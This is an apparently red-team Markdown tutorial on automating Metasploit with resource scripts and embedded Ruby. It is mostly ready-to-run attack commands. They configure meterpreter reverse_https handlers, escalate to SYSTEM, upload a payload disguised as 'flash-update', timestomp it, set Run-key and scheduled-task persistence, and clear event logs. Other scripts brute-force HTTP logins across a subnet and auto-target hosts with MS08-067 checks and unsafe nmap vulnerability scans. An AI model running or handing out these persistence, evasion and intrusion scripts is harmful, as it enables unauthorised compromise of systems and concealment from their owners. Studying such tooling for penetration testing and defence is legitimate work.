## METASPLOIT RESOURCE FILES

<blockquote>Resource scripts provide an easy way for you to automate repetitive tasks in Metasploit. Conceptually, they're just like batch scripts. They contain a set of commands that are automatically and sequentially executed when you load the script in Metasploit. You can create a resource script by chaining together a series of Metasploit console commands and by directly embedding Ruby to do things like call APIs, interact with objects in the database, and iterate actions.</blockquote>

![pic](http://i68.tinypic.com/21ovkfm.jpg)

| article chapters | jump links | command syntax |
|-------|---|---|
| how to run resource scripts?| [how to run resource scripts](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#how-to-run-resource-scripts) | msfconsole -r script.rc |
| how to write resource scripts? | [how to write resource scripts](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#how-to-write-resource-scripts) | makerc /root/script.rc | 
| RC scripts in post exploitation | [resource scripts in post exploitation](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#resource-scripts-in-post-exploitation) | run migrate -n explorer.exe |
| RC scripts in AutoRunScript | [resource scripts in AutoRunScript](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#resource-scripts-in-autorunscript) | set AutoRunScript /root/script.rc |
| using ruby (ERB scripting) | [using ruby in RC (ERB scripting)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#using-ruby-in-rc-erb-scripting) | \<ruby\>framework.db.hosts.each do \|h\|\</ruby\> |
| exercises with resource scripts | [exercises with resource scripts](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#exercises) | exercises external links |

<br />

## REFERENCIES

- [Rapid7 Resource Files](https://metasploit.help.rapid7.com/docs/resource-scripts)
- [Msfconsole Core Commands](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/)
- [Meterpreter Core Commands](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
- [My Metasploit API Cheat Sheet](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md)
- [Offensiveinfosec Writing Resource Scripts](https://offensiveinfosec.wordpress.com/2012/04/08/writing-resource-scripts-for-the-metasploit-framework/) 

---

<br /><br /><br />

##  HOW TO RUN RESOURCE SCRIPTS?
<blockquote>You can run resource scripts from msfconsole or from the web interface. Before you can run a resource script, you need to identify the required parameters that need to be configured for the script to run. If you're a Metasploit Framework user, you can run a resource script from msfconsole or meterpreter prompt with the resource command or you can run a resource script when you start msfconsole with the -r flag (making msfconsole executing the rc script at startup).</blockquote>

      msfconsole -r script.rc
      msfconsole -r /root/script.rc
      msf > resource /root/script.rc
      meterpreter > resource /root/script.rc

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## HOW TO WRITE RESOURCE SCRIPTS?
<blockquote>There are two ways to create a resource script, which are creating the script manually or using the makerc command. personally recommend the makerc command over manual scripting, since it eliminates typing errors. The makerc command saves all the previously issued commands in a file, which can be used with the resource command.</blockquote>

- **Create a resource file to display the version number of metasploit (manually)::**`[bash prompt]`<br />

      touch script.rc
      echo 'version;exit -y' > script.rc

    `[run]` msfconsole -r /root/script.rc

- **Create a resource file to display the version number of metasploit (makerc)::**`[metasploit prompt]`<br />

      kali > msfconsole
      msf > version
      msf > makerc /root/script.rc

    `[run]` msf > resource /root/script.rc

<br /><br />

<blockquote>In the next example we are going to write one handler resource file, because there are times when we 'persiste' our payload in target system and a few days passed we dont remmenber the handler configurations set that day, thats one<br />of the reasons rc scripting can be used for, besides automating the framework (erb scripting can access metasploit api).</blockquote>

- **Create a resource file using bash terminal prompt::**`[bash prompt]`<br />

      touch handler.rc

         echo 'use exploit/multi/handler' > handler.rc
         echo 'set PAYLOAD windows/meterpreter/reverse_https' >> handler.rc
         echo 'set ExitOnSession false' >> handler.rc
         echo 'set LHOST 192.168.1.71' >> handler.rc
         echo 'set LPORT 666' >> handler.rc
         echo 'exploit' >> handler.rc

    `[run]` msfconsole -r /root/handler.rc

- **Create a resource file using the core command 'makerc'::**`[metasploit prompt]`<br />

      kali > msfconsole
      msf > use exploit/multi/handler
      msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_https
      msf exploit(multi/handler) > set ExitOnSession false
      msf exploit(multi/handler) > set LHOST 192.168.1.71
      msf exploit(multi/handler) > set LPORT 666
      msf exploit(multi/handler) > exploit

      msf exploit(multi/handler) > makerc /root/handler.rc

    `[run]` msf > resource /root/handler.rc

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## RESOURCE SCRIPTS IN POST EXPLOITATION
<blockquote>Auto-run scripts are great when you need multiple modules to run automatically. Lets assume the first thing(s) we do after a successfully exploitation its to elevate the current session to NT authority/system, take a screenshot of current desktop, migrate to another process and run post exploitation modules. Having all this commands inside a rc script saves us time.</blockquote>

- **Resource script to elevate session, take screenshot, migrate and run post-modules::**`[bash prompt]`<br />

      touch script.rc

        echo 'getprivs' > script.rc
        echo 'getsystem' >> script.rc
        echo 'screenshot' >> script.rc
        echo 'run migrate -n wininit.exe' >> script.rc
        echo 'run post/windows/gather/enum_applications' >> script.rc
        echo 'run post/multi/recon/local_exploit_suggester' >> script.rc

     `[run]` meterpreter > resource /root/script.rc

<br /><br />

<blockquote>Auto-run scripts are great when you need to persiste fast your payload automatically. This next example demonstrates how to use resource scripts to successfully persiste a payload in target system and clean tracks (timestomp & clearev) after exploitation using meterpreter core commands written inside one resource script.</blockquote>

- **Resource script to elevate session, migrate, persiste payload and clear tracks::**`[bash prompt]`<br />

      touch persistence.rc

        echo 'getprivs' > persistence.rc
        echo 'getsystem' >> persistence.rc
        echo 'run migrate -n explorer.exe' >> persistence.rc
        echo 'upload update.exe %temp%\\update.exe' >> persistence.rc
        echo "timestomp -z '3/10/1999 15:15:15' %temp%\\update.exe" >> persistence.rc
        echo 'reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\\update.exe' >> persistence.rc
        echo 'run scheduleme -m 10 -c "%temp%\\update.exe"' >> persistence.rc
        echo 'clearev' >> persistence.rc

     `[run]` meterpreter > resource /root/persistence.rc

<br /><br />

<blockquote>In the next resource script all auxiliary modules require that RHOSTS and THREADS options are set before running the modules. In the next example we are using SETG (global variable declarations) to configurate all the options that we need before running the modules. So its advice before writing a resource file like this one, to first check what options are required for the auxiliary to run. The next rc script will run 3 auxiliary modules againts all hosts found inside local lan.</blockquote>

- **Using SETG global variable to config auxiliary(s) modules options::**`[bash prompt]`<br />

      touch http_brute.rc

         echo 'setg THREADS 8' > /root/http_brute.rc
         echo 'setg RHOSTS 192.168.1.0/24' >> /root/http_brute.rc
         echo 'run auxiliary/gather/http/http_version' >> /root/http_brute.rc
         echo 'run auxiliary/gather/http/dir_scanner' >> /root/http_brute.rc
         echo 'run auxiliary/gather/http/http_login' >> /root/http_brute.rc

     `[run]` msfconsole > resource -r /root/http_brute.rc

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## RESOURCE SCRIPTS IN AutoRunScript
<blockquote>This next example demonstrates how we can auto-run our resource script automatically at session creation with the help of @darkoperator 'post/multi/gather/multi_command.rb' and msfconsole 'AutoRunScript' handler flag, for this to work we need to define a global variable (setg RESOURCE /root/gather.rc) to call our resource script at session creation.</blockquote>

- **RC::Post-Exploit::Script::Gather::**`[gather.rc]`<br />

      touch gather.rc

         echo 'sysinfo' > /root/gather.rc
         echo 'getuid' >> /root/gather.rc
         echo 'screenshot' >> /root/gather.rc

- **RC::AutoRunScript::Handler::**`[script.rc]`<br />

      touch handler.rc

         echo 'setg resource /root/gather.rc' > handler.rc
         echo 'use exploit/multi/handler' >> handler.rc
         echo 'set AutoRunScript post/multi/gather/multi_command' >> handler.rc
         echo 'set PAYLOAD windows/meterpreter/reverse_https' >> handler.rc
         echo 'set ExitOnSession false' >> handler.rc
         echo 'set LHOST 192.168.1.71' >> handler.rc
         echo 'set LPORT 666' >> handler.rc
         echo 'exploit' >> handler.rc

     `[run]` msfconsole > resource -r /root/handler.rc

<br /><br />

- **Handler::AutoRunScript::OneLiner::**`[msfconsole prompt]`<br />
<blockquote>The easy way to reproduce this is: execute one multi/handler with the 'AutoRunScript' flag executing @darkoperator 'multi_console_command' script with the -rc argument pointing to the absoluct path of our gather.rc script. That will execute our gather.rc (auto-running our resource script automatically at session creation).</blockquote>

      sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD windows/meterpreter/reverse_https; set AutoRunScript multi_console_command -rc /root/gather.rc; exploit'

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## USING RUBY IN RC (ERB scripting)
<blockquote>ERB is a way to embed Ruby code directly into a document. This allow us to call APIs that are not exposed<br />via console commands and to programmatically generate and return a list of commands based on their own logic.<br />Basically ERB scripting its the same thing that writing a metasploit module from scratch using "ruby" programing language and some knowledge of metasploit (ruby) API calls. One of the advantages of using ERB scripting is<br />that we can use simple msfconsole or meterpreter commands together with ruby syntax or metasploit APIs.</blockquote>

- **ERB scripting (ruby)::**`[resource_script.rc]`<br />

      workspace -a http_title
      db_nmap -Pn -T4 -n -v -p 80 --open 192.168.33.0/24
      use auxiliary/scanner/http/title
         <ruby>
           run_single("set RHOSTS #{framework.db.hosts.map(&:address).join(' ')}")
         </ruby>
      run

     `[run]` msfconsole > resource -r /root/script.rc

<br /><br />

- **FFF**

      setg 192.168.1.71 192.168.1.254

<br />

      <ruby>
      framework.db.hosts.each do |h|
         h.services.each do |serv|
 
         if serv.port == 445 and h.os_flavor =~/XP|.NET Server|2003/i
                next if (serv.port != 445)
                print_good("#{h.address} seems to be Windows #{h.os_flavor}...")
                self.run_single("use exploit/windows/smb/ms08_067_netapi")
                print_good("Running ms08_067_netapi check against #{h.address}")
                self.run_single("set RHOST #{h.address}")
                self.run_single("check")
   
         elsif serv.port == 5900 and h.os_name =~/Linux/i
                next if (serv.port != 5900)
                print_good("#{h.address} seems to be Linux #{h.os_flavor}...")
                self.run_single("use auxiliary/scanner/vnc/vnc_none_auth")
                print_good("Running VNC no auth check against #{h.os_flavor}")
                self.run_single("set RHOSTS #{h.address}")
                self.run_single("run")
 
         else
                print_error("#{h.address} does not have port 445/5900 open")
                return nil 
         end
       end
      end
      </ruby>

     `[run]` msfconsole > resource -r /root/script.rc

<br /><br />

- **FFF**

      setg 192.168.1.71 192.168.1.254

<br />

      <ruby>
        print_line("")
        print_status("Please wait, checking if RHOSTS are set globally.")
          if (framework.datastore['RHOSTS'] == nil)
            print_error("[ERROR] Please set RHOSTS globally: setg RHOSTS xxx.xxx.xxx.xxx")
            return nil
          end

          # Using nmap to populate metasploit database (db_nmap)
          print_good("RHOSTS set globally [ OK ] running scans.")
          self.run_single("db_nmap -sU -sS -Pn -n --script=smb-check-vulns.nse,samba-vuln-cve-2012-1182 --script-args=unsafe=1 -p U:135,T:139,445 #{framework.datastore['RHOSTS']}")

          # Displays msf database results stored into 'services' and 'vulns' 
          self.run_single("services #{framework.datastore['RHOSTS']}")
          self.run_single("vulns #{framework.datastore['RHOSTS']}")
          print_line("")

          print_good("Please wait, running msf auxiliary modules.")
          self.run_single("use auxiliary/scanner/snmp/snmp_enum")
          self.run_single("run")
          self.run_single("use auxiliary/scanner/snmp/snmp_enumusers")
          self.run_single("run")
          self.run_single("use auxiliary/scanner/snmp/snmp_enumshares")
          self.run_single("run")
      </ruby>

     `[run]` msfconsole > resource -r /root/script.rc

<br />

![pic](http://i66.tinypic.com/2ywxvf7.png)

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## EXERCISES

- [exercise 1](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/RC%5BERB%5D%20basic%20notions%20lesson%204)<br />
- [exercise 2](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/RC%5BERB%5D%20basic%20notions%20lesson%205)<br />
- [exercise 3 (ERB)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/RC%5BERB%5D%20basic%20notions%20lesson%207)<br />
- [exercise 4 (ERB)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/RC%5BERB%5D%20basic%20notions%20lesson%208)<br />

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## Suspicious Shell Activity (Red Team) @2019


